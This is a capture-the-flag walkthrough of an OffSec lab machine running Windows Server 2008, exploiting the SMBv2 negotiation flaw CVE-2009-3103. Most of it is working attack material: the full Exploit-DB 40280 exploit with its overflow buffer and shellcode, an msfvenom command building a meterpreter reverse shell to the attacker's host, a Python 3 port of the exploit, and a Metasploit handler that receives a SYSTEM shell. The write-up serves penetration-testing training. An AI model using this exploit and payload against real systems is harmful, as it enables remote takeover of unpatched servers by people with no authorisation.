# Internal

- [Machine information](#machine-information)
- [Solution](#solution)
- [References](#references)

## Machine information

```text
Type: PG Practice
Difficulty: Easy
Community Rating: Easy
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
OS: Windows
Points: 10
Number of Flags: 1
Lab Description:
This lab allows Learners to exploit the SMBv2 negotiation vulnerability (CVE-2009-3103) on a Windows 
Server 2008 system. Learners will leverage the Metasploit framework to execute this vulnerability, 
bypassing authentication to obtain a SYSTEM-level shell. This challenge highlights the importance 
of patching legacy systems and the risks associated with unpatched SMB services.
Released: 3 Aug 2020
```

Machine link: [https://portal.offsec.com/machine/internal-169/overview/details](https://portal.offsec.com/machine/internal-169/overview/details)

## Solution

### Scan for services with nmap

We start by scanning the machine on all ports with `nmap` including service info and default scripts

```bash
┌──(kali㉿kali)-[/mnt/hgfs/OffSec_PG/PG_Practice/Internal]
└─$ export TARGET_IP=192.168.129.40                                               

┌──(kali㉿kali)-[/mnt/hgfs/OffSec_PG/PG_Practice/Internal]
└─$ sudo nmap -sV -sC -p- $TARGET_IP
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-03 14:21 CEST
Nmap scan report for 192.168.129.40
Host is up (0.041s latency).
Not shown: 65485 closed tcp ports (reset), 37 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.0.6001 (17714650)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
|_ssl-date: 2025-09-03T12:24:24+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: INTERNAL
|   NetBIOS_Domain_Name: INTERNAL
|   NetBIOS_Computer_Name: INTERNAL
|   DNS_Domain_Name: internal
|   DNS_Computer_Name: internal
|   Product_Version: 6.0.6001
|_  System_Time: 2025-09-03T12:24:15+00:00
| ssl-cert: Subject: commonName=internal
| Not valid before: 2025-07-24T21:18:58
|_Not valid after:  2026-01-23T21:18:58
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  msrpc         Microsoft Windows RPC
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: INTERNAL; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008::sp1, cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2

Host script results:
|_clock-skew: mean: 1h23m59s, deviation: 3h07m49s, median: 0s
|_nbstat: NetBIOS name: INTERNAL, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:9e:bc:34 (VMware)
| smb-os-discovery: 
|   OS: Windows Server (R) 2008 Standard 6001 Service Pack 1 (Windows Server (R) 2008 Standard 6.0)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: internal
|   NetBIOS computer name: INTERNAL\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-09-03T05:24:15-07:00
| smb2-time: 
|   date: 2025-09-03T12:24:15
|_  start_date: 2025-07-25T21:18:51
| smb2-security-mode: 
|   2:0:2: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 156.15 seconds
```

We have six main services running and available:

- Microsoft DNS 6.0.6001 running on port 53
- Microsoft RPC running on port 135
- NetBIOS Session Service running on port 139
- SMB running on port 445
- Microsoft Terminal Service running on port 3389
- Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) running on port 5357

We also see that the machine is called `Internal`, is running `Windows Server 2008` and is a member of the workgroup `WORKGROUP`.

### Analyse the SMB service

Next, we check the SMB service for vulnerabilities with nmap

```bash
┌──(kali㉿kali)-[/mnt/hgfs/OffSec_PG/PG_Practice/Internal]
└─$ 
nmap -v -p 139,445 --script vuln $TARGET_IP
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-03 14:37 CEST
NSE: Loaded 105 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 14:37
Completed NSE at 14:37, 7.38s elapsed
Initiating NSE at 14:37
Completed NSE at 14:37, 0.00s elapsed
Initiating Ping Scan at 14:37
Scanning 192.168.129.40 [4 ports]
Completed Ping Scan at 14:37, 0.07s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:37
Completed Parallel DNS resolution of 1 host. at 14:37, 0.01s elapsed
Initiating SYN Stealth Scan at 14:37
Scanning 192.168.129.40 [2 ports]
Discovered open port 445/tcp on 192.168.129.40
Discovered open port 139/tcp on 192.168.129.40
Completed SYN Stealth Scan at 14:37, 0.06s elapsed (2 total ports)
NSE: Script scanning 192.168.129.40.
Initiating NSE at 14:37
Completed NSE at 14:38, 23.28s elapsed
Initiating NSE at 14:38
Completed NSE at 14:38, 0.00s elapsed
Nmap scan report for 192.168.129.40
Host is up (0.036s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-cve2009-3103: 
|   VULNERABLE:
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2009-3103
|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
|           denial of service (system crash) via an & (ampersand) character in a Process ID High header field in a NEGOTIATE
|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
|           aka "SMBv2 Negotiation Vulnerability."
|           
|     Disclosure date: 2009-09-08
|     References:
|       http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: EOF
|_smb-vuln-ms10-054: false
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: EOF

NSE: Script Post-scanning.
Initiating NSE at 14:38
Completed NSE at 14:38, 0.00s elapsed
Initiating NSE at 14:38
Completed NSE at 14:38, 0.00s elapsed
Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 31.21 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (116B)
```

The machine seems to be vulnerable for CVE-2009-3103.  
Information is available from Microsoft in their security bulletin MS09-050.

### Search for available exploits

There ought to be available exploits for this vulnerability

```bash
┌──(kali㉿kali)-[/mnt/hgfs/OffSec_PG/PG_Practice/Internal]
└─$ searchsploit --cve CVE-2009-3103
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                        |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Microsoft Windows - 'srv2.sys' SMB Code Execution (Python) (MS09-050)                                                                                 | windows/remote/40280.py
Microsoft Windows - 'srv2.sys' SMB Negotiate ProcessID Function Table Dereference (MS09-050)                                                          | windows/remote/14674.txt
Microsoft Windows - 'srv2.sys' SMB Negotiate ProcessID Function Table Dereference (MS09-050) (Metasploit)                                             | windows/remote/16363.rb
Microsoft Windows - SMB2 Negotiate Protocol '0x72' Response Denial of Service                                                                         | windows/dos/12524.py
Microsoft Windows 7/2008 R2 - Remote Kernel Crash                                                                                                     | windows/dos/10005.py
Microsoft Windows Vista/7 - SMB2.0 Negotiate Protocol Request Remote Blue Screen of Death (MS07-063)                                                  | windows/dos/9594.txt
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

┌──(kali㉿kali)-[/mnt/hgfs/OffSec_PG/PG_Practice/Internal]
└─$ searchsploit -m 40280
  Exploit: Microsoft Windows - 'srv2.sys' SMB Code Execution (Python) (MS09-050)
      URL: https://www.exploit-db.com/exploits/40280
     Path: /usr/share/exploitdb/exploits/windows/remote/40280.py
    Codes: CVE-2009-3103, CVE-2009-2532, CVE-2009-2526, MS09-050
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /mnt/hgfs/OffSec_PG/PG_Practice/Internal/40280.py

┌──(kali㉿kali)-[/mnt/hgfs/OffSec_PG/PG_Practice/Internal]
└─$ cat 40280.py        
# EDB-Note: Source ~ https://raw.githubusercontent.com/ohnozzy/Exploit/master/MS09_050.py

#!/usr/bin/python
#This module depends on the linux command line program smbclient.
#I can't find a python smb library for smb login. If you can find one, you can replace that part of the code with the smb login function in python.
#The idea is that after the evil payload is injected by the first packet, it need to be trigger by an authentication event. Whether the authentication successes or not does not matter.
import tempfile
import sys
import subprocess
from socket import socket
from time import sleep
from smb.SMBConnection import SMBConnection


try:

        target = sys.argv[1]
except IndexError:
        print '\nUsage: %s <target ip>\n' % sys.argv[0]
        print 'Example: MS36299.py 192.168.1.1 1\n'
        sys.exit(-1)

#msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.30.77 LPORT=443  EXITFUNC=thread  -f python
shell =  ""
shell += "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"   #fce8820000006089e531c0648b
shell += "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
shell += "\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
shell += "\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
shell += "\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
shell += "\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
shell += "\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
shell += "\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
shell += "\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
shell += "\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
shell += "\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
shell += "\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
shell += "\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
shell += "\xff\xd5\x6a\x05\x68\xc0\xa8\x1e\x4d\x68\x02\x00\x01"
shell += "\xbb\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea"
shell += "\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5"
shell += "\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec"
shell += "\xe8\x61\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02"
shell += "\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a"
shell += "\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53"
shell += "\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9"
shell += "\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x22\x58\x68\x00\x40"
shell += "\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57"
shell += "\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\xe9"
shell += "\x71\xff\xff\xff\x01\xc3\x29\xc6\x75\xc7\xc3\xbb\xe0"
shell += "\x1d\x2a\x0a\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c"
shell += "\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00"
shell += "\x53\xff\xd5"



host = target, 445

buff ="\x00\x00\x03\x9e\xff\x53\x4d\x42"
buff+="\x72\x00\x00\x00\x00\x18\x53\xc8"
buff+="\x17\x02" #high process ID
buff+="\x00\xe9\x58\x01\x00\x00"
buff+="\x00\x00\x00\x00\x00\x00\x00\x00"
buff+="\x00\x00\xfe\xda\x00\x7b\x03\x02"
buff+="\x04\x0d\xdf\xff"*25
buff+="\x00\x02\x53\x4d"
buff+="\x42\x20\x32\x2e\x30\x30\x32\x00"
buff+="\x00\x00\x00\x00"*37
buff+="\xff\xff\xff\xff"*2
buff+="\x42\x42\x42\x42"*7
buff+="\xb4\xff\xff\x3f" #magic index
buff+="\x41\x41\x41\x41"*6
buff+="\x09\x0d\xd0\xff" #return address

#stager_sysenter_hook from metasploit

buff+="\xfc\xfa\xeb\x1e\x5e\x68\x76\x01"
buff+="\x00\x00\x59\x0f\x32\x89\x46\x5d"
buff+="\x8b\x7e\x61\x89\xf8\x0f\x30\xb9"
buff+="\x16\x02\x00\x00\xf3\xa4\xfb\xf4"
buff+="\xeb\xfd\xe8\xdd\xff\xff\xff\x6a"
buff+="\x00\x9c\x60\xe8\x00\x00\x00\x00"
buff+="\x58\x8b\x58\x54\x89\x5c\x24\x24"
buff+="\x81\xf9\xde\xc0\xad\xde\x75\x10"
buff+="\x68\x76\x01\x00\x00\x59\x89\xd8"
buff+="\x31\xd2\x0f\x30\x31\xc0\xeb\x31"
buff+="\x8b\x32\x0f\xb6\x1e\x66\x81\xfb"
buff+="\xc3\x00\x75\x25\x8b\x58\x5c\x8d"
buff+="\x5b\x69\x89\x1a\xb8\x01\x00\x00"
buff+="\x80\x0f\xa2\x81\xe2\x00\x00\x10"
buff+="\x00\x74\x0e\xba\x00\xff\x3f\xc0"
buff+="\x83\xc2\x04\x81\x22\xff\xff\xff"
buff+="\x7f\x61\x9d\xc3\xff\xff\xff\xff"
buff+="\x00\x04\xdf\xff\x00\x04\xfe\x7f"
buff+="\x60\x6a\x30\x58\x99\x64\x8b\x18"
buff+="\x39\x53\x0c\x74\x2b\x8b\x43\x10"
buff+="\x8b\x40\x3c\x83\xc0\x28\x8b\x08"
buff+="\x03\x48\x03\x81\xf9\x6c\x61\x73"
buff+="\x73\x75\x15\xe8\x07\x00\x00\x00"
buff+="\xe8\x0d\x00\x00\x00\xeb\x09\xb9"
buff+="\xde\xc0\xad\xde\x89\xe2\x0f\x34"
buff+="\x61\xc3\x81\xc4\x54\xf2\xff\xff"

buff+=shell

s = socket()
s.connect(host)
s.send(buff)
s.close()
#Trigger the above injected code via authenticated process.
subprocess.call("echo '1223456' | rpcclient -U Administrator %s"%(target), shell=True)  
```

We have a Python 2 exploit with some unknown payload generated with msfvenom.

### Update the exploit script

Let's create our own payload with `msfvenom`. We will use the same payload type (`windows/meterpreter/reverse_tcp`).

```bash
┌──(kali㉿kali)-[/mnt/hgfs/OffSec_PG/PG_Practice/Internal]
└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.180 LPORT=443 EXITFUNC=thread -f python -v shell 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 375 bytes
Final size of python file: 1929 bytes
shell =  b""
shell += b"\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64"
shell += b"\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a"
shell += b"\x26\x31\xff\x8b\x72\x28\x31\xc0\xac\x3c\x61\x7c"
shell += b"\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49\x75\xef\x52"
shell += b"\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78"
shell += b"\x85\xc0\x74\x4c\x01\xd0\x50\x8b\x58\x20\x01\xd3"
shell += b"\x8b\x48\x18\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34"
shell += b"\x8b\x01\xd6\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38"
shell += b"\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58"
shell += b"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
shell += b"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b"
shell += b"\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12"
shell += b"\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00\x00\x68"
shell += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8"
shell += b"\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
shell += b"\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x2d"
shell += b"\xb4\x68\x02\x00\x01\xbb\x89\xe6\x50\x50\x50\x50"
shell += b"\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97"
shell += b"\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85"
shell += b"\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00"
shell += b"\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f"
shell += b"\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68"
shell += b"\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5"
shell += b"\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9"
shell += b"\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00"
shell += b"\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff"
shell += b"\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff"
shell += b"\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff"
shell += b"\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xe0\x1d\x2a"
shell += b"\x0a\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a"
shell += b"\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00"
shell += b"\x53\xff\xd5"
```

Then we update the exploit with our shellcode. We also update the script to Python 3 regarding:

- Print statements, add parenthesis
- Convert strings to byte-strings

The updated script looks like this

```python
# EDB-Note: Source ~ https://raw.githubusercontent.com/ohnozzy/Exploit/master/MS09_050.py

#!/usr/bin/python
#This module depends on the linux command line program smbclient.
#I can't find a python smb library for smb login. If you can find one, you can replace that part of the code with the smb login function in python.
#The idea is that after the evil payload is injected by the first packet, it need to be trigger by an authentication event. Whether the authentication successes or not does not matter.
import tempfile
import sys
import subprocess
from socket import socket
from time import sleep
from smb.SMBConnection import SMBConnection


try:

        target = sys.argv[1]
except IndexError:
        print('\nUsage: %s <target ip>\n' % sys.argv[0])
        print('Example: MS36299.py 192.168.1.1 1\n')
        sys.exit(-1)

shell =  b""
shell += b"\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64"
shell += b"\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a"
shell += b"\x26\x31\xff\x8b\x72\x28\x31\xc0\xac\x3c\x61\x7c"
shell += b"\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49\x75\xef\x52"
shell += b"\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78"
shell += b"\x85\xc0\x74\x4c\x01\xd0\x50\x8b\x58\x20\x01\xd3"
shell += b"\x8b\x48\x18\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34"
shell += b"\x8b\x01\xd6\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38"
shell += b"\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58"
shell += b"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
shell += b"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b"
shell += b"\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12"
shell += b"\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00\x00\x68"
shell += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8"
shell += b"\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
shell += b"\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x2d"
shell += b"\xb4\x68\x02\x00\x01\xbb\x89\xe6\x50\x50\x50\x50"
shell += b"\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97"
shell += b"\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85"
shell += b"\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00"
shell += b"\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f"
shell += b"\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68"
shell += b"\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5"
shell += b"\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9"
shell += b"\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00"
shell += b"\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff"
shell += b"\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff"
shell += b"\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff"
shell += b"\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xe0\x1d\x2a"
shell += b"\x0a\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a"
shell += b"\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00"
shell += b"\x53\xff\xd5"

host = target, 445

buff = b"\x00\x00\x03\x9e\xff\x53\x4d\x42"
buff+= b"\x72\x00\x00\x00\x00\x18\x53\xc8"
buff+= b"\x17\x02" #high process ID
buff+= b"\x00\xe9\x58\x01\x00\x00"
buff+= b"\x00\x00\x00\x00\x00\x00\x00\x00"
buff+= b"\x00\x00\xfe\xda\x00\x7b\x03\x02"
buff+= b"\x04\x0d\xdf\xff"*25
buff+= b"\x00\x02\x53\x4d"
buff+= b"\x42\x20\x32\x2e\x30\x30\x32\x00"
buff+= b"\x00\x00\x00\x00"*37
buff+= b"\xff\xff\xff\xff"*2
buff+= b"\x42\x42\x42\x42"*7
buff+= b"\xb4\xff\xff\x3f" #magic index
buff+= b"\x41\x41\x41\x41"*6
buff+= b"\x09\x0d\xd0\xff" #return address

#stager_sysenter_hook from metasploit

buff+= b"\xfc\xfa\xeb\x1e\x5e\x68\x76\x01"
buff+= b"\x00\x00\x59\x0f\x32\x89\x46\x5d"
buff+= b"\x8b\x7e\x61\x89\xf8\x0f\x30\xb9"
buff+= b"\x16\x02\x00\x00\xf3\xa4\xfb\xf4"
buff+= b"\xeb\xfd\xe8\xdd\xff\xff\xff\x6a"
buff+= b"\x00\x9c\x60\xe8\x00\x00\x00\x00"
buff+= b"\x58\x8b\x58\x54\x89\x5c\x24\x24"
buff+= b"\x81\xf9\xde\xc0\xad\xde\x75\x10"
buff+= b"\x68\x76\x01\x00\x00\x59\x89\xd8"
buff+= b"\x31\xd2\x0f\x30\x31\xc0\xeb\x31"
buff+= b"\x8b\x32\x0f\xb6\x1e\x66\x81\xfb"
buff+= b"\xc3\x00\x75\x25\x8b\x58\x5c\x8d"
buff+= b"\x5b\x69\x89\x1a\xb8\x01\x00\x00"
buff+= b"\x80\x0f\xa2\x81\xe2\x00\x00\x10"
buff+= b"\x00\x74\x0e\xba\x00\xff\x3f\xc0"
buff+= b"\x83\xc2\x04\x81\x22\xff\xff\xff"
buff+= b"\x7f\x61\x9d\xc3\xff\xff\xff\xff"
buff+= b"\x00\x04\xdf\xff\x00\x04\xfe\x7f"
buff+= b"\x60\x6a\x30\x58\x99\x64\x8b\x18"
buff+= b"\x39\x53\x0c\x74\x2b\x8b\x43\x10"
buff+= b"\x8b\x40\x3c\x83\xc0\x28\x8b\x08"
buff+= b"\x03\x48\x03\x81\xf9\x6c\x61\x73"
buff+= b"\x73\x75\x15\xe8\x07\x00\x00\x00"
buff+= b"\xe8\x0d\x00\x00\x00\xeb\x09\xb9"
buff+= b"\xde\xc0\xad\xde\x89\xe2\x0f\x34"
buff+= b"\x61\xc3\x81\xc4\x54\xf2\xff\xff"

buff+=shell

s = socket()
s.connect(host)
s.send(buff)
s.close()
#Trigger the above injected code via authenticated process.
subprocess.call("echo '1223456' | rpcclient -U Administrator %s"%(target), shell=True)
```

### Install pysmb module for Python

The exploit uses/requires the smb module and there is no such module installed on our Kali machine.

```bash
┌──(kali㉿kali)-[/mnt/hgfs/OffSec_PG/PG_Practice/Internal]
└─$ python         
Python 3.13.2 (main, Feb  5 2025, 01:23:35) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from smb.SMBConnection import SMBConnection
Traceback (most recent call last):
  File "<python-input-0>", line 1, in <module>
    from smb.SMBConnection import SMBConnection
ModuleNotFoundError: No module named 'smb'
>>> exit()
```

Kali requires Python module installation to be done in a virtual environment so we create a new one.

```bash
┌──(kali㉿kali)-[~]
└─$ cd Python_venvs 

┌──(kali㉿kali)-[~/Python_venvs]
└─$ python -m venv pysmb 

┌──(kali㉿kali)-[~/Python_venvs]
└─$ cd pysmb       

┌──(kali㉿kali)-[~/Python_venvs/pysmb]
└─$ bin/pip install pysmb                                
Collecting pysmb
  Downloading pysmb-1.2.11-py3-none-any.whl.metadata (1.6 kB)
Collecting pyasn1 (from pysmb)
  Using cached pyasn1-0.6.1-py3-none-any.whl.metadata (8.4 kB)
Collecting tqdm (from pysmb)
  Using cached tqdm-4.67.1-py3-none-any.whl.metadata (57 kB)
Downloading pysmb-1.2.11-py3-none-any.whl (85 kB)
Using cached pyasn1-0.6.1-py3-none-any.whl (83 kB)
Using cached tqdm-4.67.1-py3-none-any.whl (78 kB)
Installing collected packages: tqdm, pyasn1, pysmb
Successfully installed pyasn1-0.6.1 pysmb-1.2.11 tqdm-4.67.1

┌──(kali㉿kali)-[~/Python_venvs/pysmb]
└─$ source ./bin/activate             

┌──(pysmb)─(kali㉿kali)-[~/Python_venvs/pysmb]
└─$ python              
Python 3.13.2 (main, Feb  5 2025, 01:23:35) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from smb.SMBConnection import SMBConnection
>>> exit()
```

So far so good.

### Get a shell

Now we start an `exploit/multi/handler` in Metasploit

```bash
┌──(kali㉿kali)-[/mnt/hgfs/OffSec_PG/PG_Practice/Internal]
└─$ msfconsole -q
msf > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > show options

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

msf exploit(multi/handler) > set LHOST tun0
LHOST => 192.168.45.180
msf exploit(multi/handler) > set LPORT 443
LPORT => 443
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.45.180:443 
```

### Execute the exploit script

And then we execute the exploit script

```bash
┌──(kali㉿kali)-[/mnt/hgfs/OffSec_PG/PG_Practice/Internal]
└─$ source ~/Python_venvs/pysmb/bin/activate

┌──(pysmb)─(kali㉿kali)-[/mnt/hgfs/OffSec_PG/PG_Practice/Internal]
└─$ python 40280.py  

Usage: 40280.py <target ip>

Example: MS36299.py 192.168.1.1 1


┌──(pysmb)─(kali㉿kali)-[/mnt/hgfs/OffSec_PG/PG_Practice/Internal]
└─$ python 40280.py $TARGET_IP                                                                             
Cannot connect to server.  Error was NT_STATUS_IO_TIMEOUT
```

It looks like the exploit failed but checking our listener we have a connection.

### Get the root flag

So we can get the only flag on the machine

```bash
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.45.180:443 
[*] Sending stage (177734 bytes) to 192.168.129.40
[*] Meterpreter session 1 opened (192.168.45.180:443 -> 192.168.129.40:49159) at 2025-09-03 16:33:52 +0200

meterpreter > shell
Process 3816 created.
Channel 1 created.
Microsoft Windows [Version 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>where.exe /R C:\ proof.txt
where.exe /R C:\ proof.txt
C:\Users\Administrator\Desktop\proof.txt

C:\Windows\system32>type C:\Users\Administrator\Desktop\proof.txt
type C:\Users\Administrator\Desktop\proof.txt
7<REDACTED>c

C:\Windows\system32>exit
exit
meterpreter > 
```

For additional information, please see the references below.

## References

- [CVE-2009-3103 - NIST](https://nvd.nist.gov/vuln/detail/CVE-2009-3103)
